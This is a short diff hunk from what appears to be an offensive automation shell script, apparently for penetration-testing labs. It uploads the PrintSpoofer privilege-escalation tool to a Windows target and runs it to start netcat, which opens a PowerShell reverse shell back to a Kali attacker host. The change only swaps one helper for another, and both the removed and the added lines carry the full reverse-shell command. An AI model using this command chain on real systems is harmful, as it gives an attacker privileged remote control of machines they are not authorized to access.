@@ -33,5 +33,5 @@ ps_webclient_upload_file "${LOCATION}" "${FILE}"
 PRINTSPOOFER_FILE_LOCATION="${FILE_LOCATION}"
 sleep 3
 
-paste_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e powershell\""
-xdotool key Return
+execute_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e powershell\""
+create_new_line
